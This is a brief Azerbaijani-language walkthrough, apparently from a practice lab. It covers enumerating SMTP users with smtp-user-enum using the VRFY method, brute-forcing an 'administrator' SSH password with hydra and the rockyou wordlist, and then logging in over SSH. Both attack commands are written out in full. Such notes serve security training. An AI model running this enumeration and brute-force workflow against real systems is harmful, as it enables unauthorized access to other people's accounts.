# ilk olaraq nmap skani atdiqdan sonra bize 25ci port yeni smtp portunu aciq olduqunu gosterdikden sonra biz smtp-user-enum toolu ile user adlarini default olaraq bize gosterir
Tool

    smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip
## daha sonra bize default userleri gosterdikden sonra (meselen administrator) biz hydra vasitesi ile userleri bruteforce edirik
Tool 

    hydra -l  administrator -P  /usr/share/wordlists/rockyou.txt ssh://10.10.224.200

  ## user passwd tapdiqdan sonra ssh ile daxil oluruq 
    
